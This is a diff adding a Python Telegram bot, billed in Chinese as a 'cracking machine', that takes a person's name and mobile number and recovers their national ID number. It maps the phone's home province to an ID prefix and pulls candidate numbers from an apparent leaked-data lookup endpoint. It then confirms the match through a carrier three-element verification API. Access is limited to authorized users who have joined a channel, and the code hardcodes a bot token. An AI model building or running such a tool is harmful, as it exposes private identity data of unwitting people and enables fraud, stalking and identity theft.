@@ -1,0 +1,248 @@
+import telebot
+import requests
+import time
+import urllib.parse
+import os
+from bs4 import BeautifulSoup
+import re
+
+# 使用你自己的 bot token
+API_TOKEN = '8132104250:AAHo_1llbVjdt6rLSFwSN7TLIGuzAiaEsDQ'
+CHANNEL_USERNAME = 'https://t.me/csgq2'  # 需要加入的频道
+bot = telebot.TeleBot(API_TOKEN)
+
+# 授权用户ID存储文件路径
+AUTHORIZED_USERS_FILE = 'authorized_users.txt'
+
+# 载入授权用户
+def load_authorized_users():
+    authorized_users = {}
+    if os.path.exists(AUTHORIZED_USERS_FILE):
+        with open(AUTHORIZED_USERS_FILE, 'r') as file:
+            for line in file:
+                line = line.strip()
+                if line.isdigit():  # 确保是有效的数字ID
+                    authorized_users[int(line)] = True
+    return authorized_users
+
+# 保存授权用户
+def save_authorized_users(authorized_users):
+    with open(AUTHORIZED_USERS_FILE, 'w') as file:
+        for user_id in authorized_users:
+            file.write(f"{user_id}\n")
+
+# 获取授权用户列表
+authorized_users = load_authorized_users()
+
+# 管理员ID
+ADMIN_USER_ID = 7931389354
+
+# 中国各省市身份证号码前两位
+id_prefix = {
+    "北京": "11", "天津": "12", "河北": "13", "山西": "14", "内蒙古": "15",
+    "辽宁": "21", "吉林": "22", "黑龙江": "23", "上海": "31", "江苏": "32",
+    "浙江": "33", "安徽": "34", "福建": "35", "江西": "36", "山东": "37",
+    "河南": "41", "湖北": "42", "湖南": "43", "广东": "44", "广西": "45",
+    "海南": "46", "重庆": "50", "四川": "51", "贵州": "52", "云南": "53",
+    "西藏": "54", "陕西": "61", "甘肃": "62", "青海": "63", "宁夏": "64",
+    "新疆": "65"
+}
+
+# 查询手机号信息
+def query_phone_info(phone_number):
+    url = f"https://shouji.bmcx.com/{phone_number}__shouji/"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    }
+    try:
+        response = requests.get(url, headers=headers)
+        response.raise_for_status()
+        soup = BeautifulSoup(response.content, "html.parser")
+        location_info = soup.find("table", {"bgcolor": "#C5D5C5"})
+        if location_info:
+            location_rows = location_info.find_all("tr")
+            for row in location_rows:
+                cols = row.find_all("td")
+                if len(cols) > 1:
+                    key = cols[0].text.strip()
+                    value = cols[1].text.strip()
+                    if key == "归属地":
+                        return value
+                    elif key == "运营商":
+                        return value
+        return "未知"
+    except requests.RequestException as e:
+        print(f"请求错误: {e}")
+        return "未知"
+
+# 获取身份证前两位
+def get_id_prefix(location):
+    for key, value in id_prefix.items():
+        if key in location:
+            return value
+    return "未知"
+
+# 补全身份证号码
+def complete_id_card(name, id_prefix_value):
+    api_url = f"http://kubu.hlkt.uk/杀神大王的库补接口.php?name={name}&cardno={id_prefix_value}xxxxxxxxxxxxxxxx"
+    try:
+        response = requests.get(api_url)
+        response.raise_for_status()
+        id_numbers = re.findall(r"\d{17}[\dX]", response.text)
+        return id_numbers if id_numbers else []
+    except requests.RequestException as e:
+        print(f"API 请求错误: {e}")
+        return []
+
+# 构建 URL
+def build_url(name, idcard, mobileno):
+    base_url = "https://nbapp.ihuiyin.com/esign/RequestIDCode"
+    params = {
+        "name": urllib.parse.quote(name),
+        "idcardno": idcard,
+        "mobileno": mobileno
+    }
+    query_string = urllib.parse.urlencode(params)
+    return f"{base_url}?{query_string}"
+
+# 验证运营商信息
+def verify_operator_three_elements(name, idcard, mobileno):
+    url = build_url(name, idcard, mobileno)
+    try:
+        response = requests.get(url, timeout=20)
+        response.raise_for_status()
+        data = response.json()
+        Type_field = data.get('Type')
+        return Type_field == 0
+    except requests.RequestException as e:
+        print(f"请求错误: {e}")
+        return False
+    except ValueError:
+        print("响应解析错误")
+        return False
+
+# 检查用户是否已加入频道
+def check_user_in_channel(chat_id):
+    try:
+        member = bot.get_chat_member(CHANNEL_USERNAME, chat_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except telebot.apihelper.ApiException:
+        return False
+
+# 创建内联键盘
+def create_channel_button():
+    markup = telebot.types.InlineKeyboardMarkup()
+    button = telebot.types.InlineKeyboardButton(text="加入频道", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
+    markup.add(button)
+    return markup
+
+# 处理开始命令
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    if check_user_in_channel(message.chat.id):
+        bot.send_message(message.chat.id, "欢迎使用破解机机器人!请输入姓名和手机号进行操作。")
+    else:
+        bot.send_message(
+            message.chat.id,
+            "你需要加入指定的频道才能使用此机器人哦,请点击下方按钮进入频道后再操作。",
+            reply_markup=create_channel_button()
+        )
+
+# 处理授权指令
+@bot.message_handler(commands=['qx'])
+def authorize_user(message):
+    if message.from_user.id == ADMIN_USER_ID:
+        try:
+            # 分割命令,获取用户ID
+            command_parts = message.text.split()
+            
+            # 检查命令是否包含用户ID
+            if len(command_parts) != 2:
+                bot.send_message(message.chat.id, "请提供一个有效的用户ID。格式: /qx <用户ID>")
+                return
+
+            # 获取用户ID并确保它是数字
+            user_id_str = command_parts[1]
+            if not user_id_str.isdigit():
+                bot.send_message(message.chat.id, "用户ID必须是一个有效的数字")
+                return
+
+            # 转换为整数
+            user_id = int(user_id_str)
+
+            # 授权用户
+            authorized_users[user_id] = True
+            save_authorized_users(authorized_users)
+            bot.send_message(message.chat.id, f"用户 {user_id} 已被授权使用机器人")
+        except Exception as e:
+            bot.send_message(message.chat.id, f"发生错误: {e}")
+    else:
+        bot.send_message(message.chat.id, "你没有权限执行此操作")
+
+# 处理撤销授权指令
+@bot.message_handler(commands=['sc'])
+def revoke_user(message):
+    if message.from_user.id == ADMIN_USER_ID:
+        try:
+            user_id = int(message.text.split()[1])
+            if user_id in authorized_users:
+                del authorized_users[user_id]
+                save_authorized_users(authorized_users)
+                bot.send_message(message.chat.id, f"用户 {user_id} 的授权已被撤销")
+            else:
+                bot.send_message(message.chat.id, f"用户 {user_id} 没有授权")
+        except Exception as e:
+            bot.send_message(message.chat.id, "请输入正确的用户ID")
+    else:
+        bot.send_message(message.chat.id, "你没有权限执行此操作")
+
+# 处理用户发送的姓名和手机号
+@bot.message_handler(func=lambda message: message.text and message.text[0].isalpha())
+def handle_input(message):
+    if not check_user_in_channel(message.chat.id):
+        bot.send_message(
+            message.chat.id,
+            "你需要加入指定的频道才能使用此机器人哦,请点击下方按钮进入频道后再操作。",
+            reply_markup=create_channel_button()
+        )
+        return
+    
+    # 检查是否是授权用户
+    if message.from_user.id not in authorized_users:
+        bot.send_message(message.chat.id, "你没有权限使用此机器人")
+        return
+
+    try:
+        name, mobileno = message.text.split()
+
+        # 回复用户正在破解中
+        bot.send_message(message.chat.id, "正在破解中 请稍候...")
+
+        归属地 = query_phone_info(mobileno)
+        id_prefix_value = get_id_prefix(归属地)
+        completed_id_cards = complete_id_card(name, id_prefix_value)
+
+        if not completed_id_cards:
+            bot.send_message(message.chat.id, "身份证信息补齐失败")
+            return
+
+        # 初始化核验成功标记
+        success = False
+        # 处理生成的身份证号
+        for id_card in completed_id_cards:
+            result = verify_operator_three_elements(name, id_card, mobileno)
+            if result:
+                bot.send_message(message.chat.id, f"姓名:{name}\n手机号:{mobileno}\n身份证:{id_card}\nJuly破解结果:🟢运营商一致")
+                success = True
+                break  # 只返回第一个核验成功的结果
+        
+        # 如果没有任何核验成功的结果
+        if not success:
+            bot.send_message(message.chat.id, "全部核验失败破解失败")
+
+    except Exception as e:
+        bot.send_message(message.chat.id, "输入格式错误,请确保格式为:姓名 手机号")
+
+# 启动机器人
+if __name__ == '__main__':
+    bot.polling(none_stop=True)
